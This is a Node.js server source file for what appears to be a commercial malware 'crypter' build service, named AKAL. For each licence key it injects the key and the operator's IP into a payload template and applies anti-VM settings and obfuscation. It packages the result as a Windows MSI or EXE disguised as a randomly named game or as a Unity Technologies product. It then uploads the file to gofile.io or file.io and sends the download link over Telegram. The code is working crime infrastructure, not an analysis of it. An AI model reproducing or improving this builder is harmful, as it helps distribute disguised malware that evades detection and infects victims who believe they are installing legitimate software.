const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const { exec } = require('child_process');
const crypto = require('crypto');
const { MongoClient } = require('mongodb');
const axios = require('axios');
const FormData = require('form-data'); 
const https = require('https'); 

const app = express();
const config = require('../config.json');
const uri = config.mongodb;
const client = new MongoClient(uri);
const db = client.db('AKAL');
const keysCollection = db.collection('keys');

app.use(express.json());

const buildQueue = []; 
let isProcessing = false;

async function updateIconFiles(key) {
    const iconFolderPath = path.join(__dirname, '..', 'icons');
    const iconFileName = `${key}.ico`;
    const iconFilePath = path.join(iconFolderPath, iconFileName);
    const packageJsonPathScript = path.join(__dirname, 'crypter', 'electron', 'script', 'package.json');

    try {
        let packageJsonScript = require(packageJsonPathScript);

        if (fs.existsSync(iconFilePath)) {
            packageJsonScript.build.win.icon = iconFileName;
            fs.copyFileSync(iconFilePath, path.join(__dirname, 'crypter', 'electron', 'script', iconFileName));
            console.log(`Icon files updated for ${key}.`);
        } else {
            const iconFilePathD = path.join(iconFolderPath, 'default.ico');
            packageJsonScript.build.win.icon = 'default.ico';
            fs.copyFileSync(iconFilePathD, path.join(__dirname, 'crypter', 'electron', 'script', 'default.ico'));
            console.log(`Icon file not found for ${key}. Using default icon.`);
        }

        fs.writeFileSync(packageJsonPathScript, JSON.stringify(packageJsonScript, null, 2));
    } catch (error) {
        console.error('Error updating icon files:', error);
    }
}

async function deleteFilesAndFolders() {
    const scriptFolderPath = path.join(__dirname, 'crypter', 'electron', 'script');
    const distFolderPath = path.join(scriptFolderPath, 'dist');

    const scriptFiles = fs.readdirSync(scriptFolderPath);
    scriptFiles.forEach(file => {
        const ext = path.extname(file);
        if (ext === '.js') {
            const fullPath = path.join(scriptFolderPath, file);
            fs.unlinkSync(fullPath);
            console.log(`Deleted file: ${file}`);
        }
    });
    if (fs.existsSync(distFolderPath)) {
        fs.rmSync(distFolderPath, { recursive: true, force: true });
        console.log('Deleted dist folder.');
    }
}

async function deleteIcons() {
    const scriptFolderPath = path.join(__dirname, 'crypter', 'electron', 'script');

    const scriptFiles = fs.readdirSync(scriptFolderPath);
    scriptFiles.forEach(file => {
        const ext = path.extname(file);
        if (ext === '.ico') {
            const fullPath = path.join(scriptFolderPath, file);
            fs.unlinkSync(fullPath);
            console.log(`Deleted file: ${file}`);
        }
    });
}

async function deleteFilesAndFoldersPKG() {
    const scriptFolderPath = path.join(__dirname, 'crypter', 'angablue', 'script');
    
    if (!fs.existsSync(scriptFolderPath)) {
        fs.mkdirSync(scriptFolderPath, { recursive: true });
        return;
    }
    
    const scriptFiles = fs.readdirSync(scriptFolderPath);
    scriptFiles.forEach(file => {
        const ext = path.extname(file);
        if (ext === '.js' || ext === '.exe' || ext === '.ico') {
            const fullPath = path.join(scriptFolderPath, file);
            fs.unlinkSync(fullPath);
            console.log(`Deleted file: ${file}`);
        }
    });
}

function getRandomString(length = 6) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  }
  
  function getRandomName(prefix = '', length = 4) {
    const adjectives = ['Epic', 'Silent', 'Dark', 'Hidden', 'Golden', 'Frozen', 'Wild', 'Crimson', 'Iron'];
    const nouns = ['Legends', 'Chronicles', 'Quest', 'Empire', 'Realm', 'Story', 'Code', 'Shadow', 'Storm'];
    const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
    const noun = nouns[Math.floor(Math.random() * nouns.length)];
    return `${prefix}${adj}${noun}${getRandomString(length)}`;
  }
  
  async function updatePackageJson(randomName, bOption, keyDetails = {}) {
    const packageJsonPath = path.join(__dirname, 'crypter', 'electron', 'script', 'package.json');
  
    try {
      const packageJsonContent = await fs.promises.readFile(packageJsonPath, 'utf8');
      let packageJson = JSON.parse(packageJsonContent);
  
      const randomDescription = getRandomName('Desc');
      const randomProduct = getRandomName('Game');
      const randomCompany = getRandomName('Dev');
  
      packageJson.main = `${randomName}.js`;
      packageJson.name = (keyDetails.productName || randomProduct).toLowerCase();
      packageJson.build.win.target = bOption.toLowerCase();
      packageJson.description = keyDetails.fileDescription || randomDescription;
      packageJson.build.productName = keyDetails.productName || randomProduct;
      packageJson.build.appId = `com.${(keyDetails.companyName || randomCompany).toLowerCase()}.${randomName}`;
  
      await fs.promises.writeFile(packageJsonPath, JSON.stringify(packageJson, null, 2));
      console.log("✅ package.json updated successfully");
    } catch (error) {
      console.error('❌ An error occurred while updating package.json:', error);
    }
  }

async function executeCommand(command, options) {
    return new Promise((resolve, reject) => {
        exec(command, options, (error, stdout, stderr) => {
            if (error) {
                reject({ error, stdout, stderr });
            } else {
                resolve({ stdout, stderr });
            }
        });
    });
}

async function getChatIdOwnerByKey(key) {
    const check = await keysCollection.findOne({ key: key });
    if (!check) {
      throw new Error('Key not found');
    }
    return check.keyOwner;
  }

  async function sendTelegramMessage(chatId, key, text) {
    const escapeMarkdown = (str) => {
      if (!str) return '';
      return str.replace(/([\[\]\(\)_*~`>#+-=|{}.!\\])/g, '\\$1');
    };
  
    const safeText = escapeMarkdown(text);
  
    async function trySend(id) {
      return axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
        chat_id: id,
        text: safeText,
        parse_mode: 'MarkdownV2'
      });
    }
  
    try {
      console.log('Sending Telegram message to:', chatId, 'message:', text);
      await trySend(chatId);
    } catch (error) {
      console.warn('Failed with chatId, trying with keyOwner chatId...', error.response?.data || error.message);
      try {
        const finalChatId = await getChatIdOwnerByKey(key);
        console.log('Retrying with chatId from keyOwner:', finalChatId);
        await trySend(finalChatId);
      } catch (finalError) {
        console.error('Telegram error on retry:', finalError.response?.data || finalError.message);
      }
    }
  }

async function updatePackageJsonPKG(randomName, keyDetails = {}) {
    const packageJsonPath = path.join(__dirname, 'crypter', 'angablue', 'script', 'package.json');
  
    try {
      const packageJsonContent = await fs.promises.readFile(packageJsonPath, 'utf8');
      let packageJson = JSON.parse(packageJsonContent);
  
      const randomDescription = `📦 ${getRandomName('')}: A next-gen game built on cutting-edge technology featuring ${['strategic battles', 'open worlds', 'co-op missions', 'real-time decisions'][Math.floor(Math.random() * 4)]}.`;
      const randomProduct = getRandomName('Game');
  
      packageJson.main = `${randomName}.js`;
      packageJson.bin = `${randomName}.js`;
      packageJson.description = keyDetails.fileDescription || randomDescription;
      packageJson.name = keyDetails.productName || randomProduct;
  
      await fs.promises.writeFile(packageJsonPath, JSON.stringify(packageJson, null, 2));
      console.log("✅ package.json (PKG) updated successfully");
    } catch (error) {
      console.error('❌ An error occurred while updating package.json (PKG):', error);
    }
  }

async function updateIconFilesPKG(key) {
    const iconFolderPath = path.join(__dirname, '..', 'icons');
    const iconFileName = `${key}.ico`;
    const iconFilePath = path.join(iconFolderPath, iconFileName);
    const scriptDir = path.join(__dirname, 'crypter', 'angablue', 'script');

    try {
        if (fs.existsSync(iconFilePath)) {
            fs.copyFileSync(iconFilePath, path.join(scriptDir, iconFileName));
            console.log(`✅ Icon file copied for ${key}: ${iconFileName}`);
            
            const packageJsonPath = path.join(scriptDir, 'package.json');
            if (fs.existsSync(packageJsonPath)) {
                const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
                packageJson.pkg = packageJson.pkg || {};
                packageJson.pkg.icon = iconFileName;
                fs.writeFileSync(packageJsonPath, JSON.stringify(packageJson, null, 2));
                console.log(`✅ Package.json updated with icon: ${iconFileName}`);
            }
        } else {
            console.log(`⚠️ Icon file not found for ${key}, using default`);
        }
    } catch (error) {
        console.error('❌ Error updating icon files:', error);
    }
}

async function deleteIconFilesPKG(key) {
    const scriptDir = path.join(__dirname, 'crypter', 'angablue', 'script');
    
    try {
        const iconFileName = `${key}.ico`;
        const iconFilePath = path.join(scriptDir, iconFileName);
        
        if (fs.existsSync(iconFilePath)) {
            fs.unlinkSync(iconFilePath);
            console.log(`✅ Icon file deleted: ${iconFileName}`);
        }
        
        const packageJsonPath = path.join(scriptDir, 'package.json');
        if (fs.existsSync(packageJsonPath)) {
            const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
            if (packageJson.pkg && packageJson.pkg.icon) {
                delete packageJson.pkg.icon;
                fs.writeFileSync(packageJsonPath, JSON.stringify(packageJson, null, 2));
                console.log('✅ Icon removed from package.json');
            }
        }
    } catch (error) {
        console.error('❌ Error deleting icon files:', error);
    }
}

function cleanScriptDir(filePath) {

    try {
        if (!fs.existsSync(filePath)) return; 

        const items = fs.readdirSync(filePath);

        for (const item of items) {
            const fullPath = path.join(filePath, item);
            const stat = fs.statSync(fullPath);

            if (stat.isFile() && [".js", ".ico", ".exe"].includes(path.extname(item).toLowerCase())) {
                try {
                    fs.unlinkSync(fullPath);
                    console.log(`Deleted file: ${fullPath}`);
                } catch (err) {
                }
            }

            if (stat.isDirectory() && item.toLowerCase() === "dist") {
                try {
                    fs.rmSync(fullPath, { recursive: true, force: true });
                    console.log(`Deleted folder: ${fullPath}`);
                } catch (err) {
                }
            }
        }
    } catch (err) {
    }
}

  
async function buildFile(key, chatId, bOption) {
    if (bOption && bOption.toLowerCase() === 'exe') {
        await cleanScriptDir(path.join(__dirname, 'crypter', 'angablue', 'script'));
        return await buildFilePKG(key, chatId, bOption);
    }  
    await cleanScriptDir(path.join(__dirname, 'crypter', 'electron', 'script'));
        let filePath;
        filePath = path.join(__dirname, 'crypter', 'electron', 'payload.js');
        const modifiedFilePath = path.join(__dirname, 'crypter', 'electron', 'payload1.js');

        try {
            await deleteFilesAndFolders(); 
            console.log(`${key} Builing.`);

             const AntiVMValue = await keysCollection.findOne({ key: key }) || {
                AntiVM: "True"
            };

            let data = await fs.promises.readFile(filePath, 'utf8');
            data = data.replace(/keyhere/g, key);
            data = data.replace(/iphere/g, config.ip);
            data = data.replace(/ANTIVMVALUE/g, AntiVMValue.AntiVM);
            

            await fs.promises.writeFile(modifiedFilePath, data);
            console.log('Payload file successfully updated.');
    
            const randomName = crypto.randomBytes(8).toString('hex');
            const keyDetails = await keysCollection.findOne({ key: key }) || {
                fileDescription: "Unity Game Engine",
                productName: "Unity Project",
                companyName: "Unity Technologies"
            };
    
            await updatePackageJson(randomName, bOption, keyDetails);
    
            await executeCommand(`node obfuscator.js ${randomName}.js`, { cwd: path.join(__dirname, 'crypter', 'electron') });
    setTimeout(() => {
    }, 5000); 
            await updateIconFiles(key);
            await executeCommand('npm run build', { cwd: path.join(__dirname, 'crypter', 'electron', 'script') });
    
            await fs.promises.unlink(modifiedFilePath);
    
            await STEP2(chatId, bOption, key);
            await fs.promises.unlink(path.join(__dirname, 'crypter', 'electron', 'script', `${randomName}.js`));
    
            const iconFilePath = path.join(__dirname, 'crypter', 'electron', 'script', `${key}.ico`);
    
            await deleteIfExists(iconFilePath);
            await deleteIcons(); 
        } catch (error) {
            console.error('An error occurred:', error);
            await sendTelegramMessage(chatId, key, `❌ An error occurred: ${error.message}`);
            throw error; 
    }
}

async function buildFilePKG(key, chatId, bOption) {
    let filePath;
    filePath = path.join(__dirname, 'crypter', 'angablue', 'payload.js');
    const modifiedFilePath = path.join(__dirname, 'crypter', 'angablue', 'payload1.js');

    try {
        await deleteFilesAndFoldersPKG(); 
        console.log(`${key} Building.`);
        
        let data = await fs.promises.readFile(filePath, 'utf8');
        data = data.replace(/keyhere/g, key);
        data = data.replace(/iphere/g, config.ip);

        await fs.promises.writeFile(modifiedFilePath, data);
        console.log('Payload file successfully updated.');

        const randomName = crypto.randomBytes(8).toString('hex');
        const keyDetails = await keysCollection.findOne({ key: key }) || {
            fileDescription: "Unity Game Engine",
            productName: "Unity Project",
            companyName: "Unity Technologies"
        };

        await updatePackageJsonPKG(randomName, keyDetails);

        await executeCommand(`node obfuscator.js ${randomName}.js`, { cwd: path.join(__dirname, 'crypter', 'angablue') });

        const obfuscatedFile = path.join(__dirname, 'crypter', 'angablue', 'script', `${randomName}.js`);
        const scriptDir = path.join(__dirname, 'crypter', 'angablue', 'script');
        
        if (!fs.existsSync(scriptDir)) {
            fs.mkdirSync(scriptDir, { recursive: true });
        }
        
        const packageJsonPath = path.join(scriptDir, 'package.json');
        if (fs.existsSync(packageJsonPath)) {
            const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
            const randomDescription = `📦 ${getRandomName('')}: A next-gen game built on cutting-edge technology featuring ${['strategic battles', 'open worlds', 'co-op missions', 'real-time decisions'][Math.floor(Math.random() * 4)]}.`;
            const randomProduct = getRandomName('Game');
            
            packageJson.main = `${randomName}.js`;
            packageJson.bin = `${randomName}.js`;
            packageJson.description = keyDetails.fileDescription || randomDescription;
            packageJson.name = keyDetails.productName || randomProduct;
            fs.writeFileSync(packageJsonPath, JSON.stringify(packageJson, null, 2));
            console.log('✅ Package.json updated with obfuscated file');
        }

        await updateIconFilesPKG(key);

        await executeCommand(`node builder.js --name=${randomName}.js --key=${key}`, { cwd: path.join(__dirname, 'crypter', 'angablue') });

        await fs.promises.unlink(modifiedFilePath);
        await fs.promises.unlink(obfuscatedFile);

        await STEP2PKG(chatId, key);

        await deleteIconFilesPKG(key);

    } catch (error) {
        console.error('An error occurred:', error);
        await sendTelegramMessage(chatId, key, `❌ An error occurred: ${error.message}`);
        throw error;
    }
}

async function deleteIfExists(filePath) {
    try {
        await fs.promises.access(filePath, fs.constants.F_OK);
        await fs.promises.unlink(filePath);
        console.log(`File ${filePath} has been deleted.`);
    } catch (err) {
        if (err.code === 'ENOENT') {
            console.log(`File ${filePath} does not exist.`);
        } else {
            console.error(`Error checking or deleting file ${filePath}:`, err);
        }
    }
}

async function uploadFile(filePath) {
    let uploadLink = 'Upload failed on both services';

    try {
        const goFileResponse = await axios.get('https://api.gofile.io/servers');
        const goFileServers = goFileResponse.data?.data?.servers || [];

        if (goFileServers.length > 0) {
            const goFileServer = goFileServers[0].name;
            const goFileForm = new FormData();
            goFileForm.append('file', fs.createReadStream(filePath));

            const goFileUploadUrl = `https://${goFileServer}.gofile.io/uploadFile`;
            const goFileUploadResponse = await axios.post(goFileUploadUrl, goFileForm, {
                headers: goFileForm.getHeaders(),
            });

            const goFileData = goFileUploadResponse.data?.data || {};
            if (goFileData.downloadPage) {
                uploadLink = `${goFileData.downloadPage}`;
                return uploadLink; 
            }
        }
    } catch (error) {
        console.error('GoFile upload error:', error.response ? error.response.data : error.message);
    }

    try {
        const fileIoUrl = 'https://file.io';
        const fileIoForm = new FormData();
        fileIoForm.append('file', fs.createReadStream(filePath));

        uploadLink = await new Promise((resolve, reject) => {
            const options = {
                method: 'POST',
                headers: {
                    ...fileIoForm.getHeaders(),
                },
            };

            const req = https.request(fileIoUrl, options, (res) => {
                let data = '';

                res.on('data', (chunk) => {
                    data += chunk;
                });

                res.on('end', () => {
                    if (res.statusCode === 200) {
                        const response = JSON.parse(data);
                        if (response.link) {
                            resolve(`${response.link}`);
                        } else {
                            resolve('File.io: Upload failed');
                        }
                    } else {
                        reject(new Error(`Failed to upload file to File.io. Status code: ${res.statusCode}`));
                    }
                });
            });

            req.on('error', (error) => {
                reject(error);
            });

            fileIoForm.pipe(req);
        });

        return uploadLink; 
    } catch (error) {
        console.error('File.io upload error:', error.message);
    }

    console.log('Upload failed on both services.');
    return uploadLink;
}

async function removeDirectory(directoryPath) {
    try {
        await fs.remove(directoryPath);
        console.log(`Directory ${directoryPath} has been removed.`);
    } catch (error) {
        console.error(`Error removing directory ${directoryPath}:`, error);
    }
}

async function STEP2(chatId, bOption, key) {
    try {
        const distPath = path.resolve(__dirname, 'crypter', 'electron', 'script', 'dist');
        const files = await fs.promises.readdir(distPath);

        const msiFile = files.find(file => file.endsWith('.msi'));

        let filePath;
        let fileName;

     
            if (msiFile) {
                filePath = path.join(distPath, msiFile);
                fileName = msiFile;
            } else {
                throw new Error(`No .msi file found in ${distPath}`);
            }
  
        const downloadLink = await uploadFile(filePath);
        
        if (downloadLink) {
            await keysCollection.updateOne(
                { key: key },
                { $set: { lastLink: downloadLink } }
            );
            await sendTelegramMessage(chatId, key, `${fileName} created. 
- 
Download here: ${downloadLink}`);
        } else {
            await sendTelegramMessage(chatId, key, '❌ Build completed but failed to upload.');
        }

        await removeDirectory(distPath);
    } catch (error) {
        console.error('An error occurred during the build process:', error);
        await sendTelegramMessage(chatId, key, `❌ An error occurred: ${error.message}`);
        throw error;
    }
}

async function STEP2PKG(chatId, key) {
    try {
        const distPath = path.resolve(__dirname, 'crypter', 'angablue', 'script');
        const files = await fs.promises.readdir(distPath);

        const exeFile = files.find(file => file.endsWith('.exe'));

        let filePath;
        let fileName;

            if (exeFile) {
                filePath = path.join(distPath, exeFile);
                fileName = exeFile;
            } else {
                throw new Error(`No .exe file found in ${distPath}`);
            }

        const downloadLink = await uploadFile(filePath);
        
        if (downloadLink) {
            await keysCollection.updateOne(
                { key: key },
                { $set: { lastLink: downloadLink } }
            );
            await sendTelegramMessage(chatId, key, `${fileName} created.
-
Download here: ${downloadLink}`);
        } else {
            await sendTelegramMessage(chatId, key, '❌ Build completed but failed to upload.');
        }

        await removeDirectory(exeFile);
    } catch (error) {
        console.error('An error occurred during the build process:', error);
        await sendTelegramMessage(chatId, key, `❌ An error occurred: ${error.message}`);
        throw error;
    }
}

async function processQueue() {
    if (isProcessing || buildQueue.length === 0) return;

    isProcessing = true;
    const { key, chatId, bOption, res } = buildQueue.shift();
    try {
        if (bOption && bOption.toLowerCase() === 'msi') {
            await buildFile(key, chatId, bOption);
        } else {
            await buildFile(key, chatId, bOption);
        }
        res.json({ success: true, message: 'Build process started' });
    } catch (error) {
        console.error('An error occurred during the build process:', error.message);
        if (!res.headersSent) {
            res.status(500).json({ success: false, error: 'Internal server error' });
        }
    } finally {
        isProcessing = false;
        processQueue();
    }
}
app.post('/build/:key', async (req, res) => {
    const { key } = req.params;

    try {
        const check = await keysCollection.findOne({ key: key });

        console.log('check result:', check);

        if (!check || !check.keyOwner) {
            return res.status(404).json({ success: false, message: 'Key not found or has no chat ID' });
        }
        
        const chatid = check.keyOwner.toString();
        const { buildOption: bOption = 'msi', productName: exeName, logType, session } = check;

        buildQueue.push({ key, bOption, chatid, exeName, logType, session, res });

        if (!isProcessing) {
            await processQueue();  
        } else {
            if (!res.headersSent) {
                res.json({ success: true, message: 'Build process queued' });
            }
        }
    } catch (error) {
        console.error('Error in build process:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

app.listen(1331, () => {
    console.log('Server is running on port 1331');
});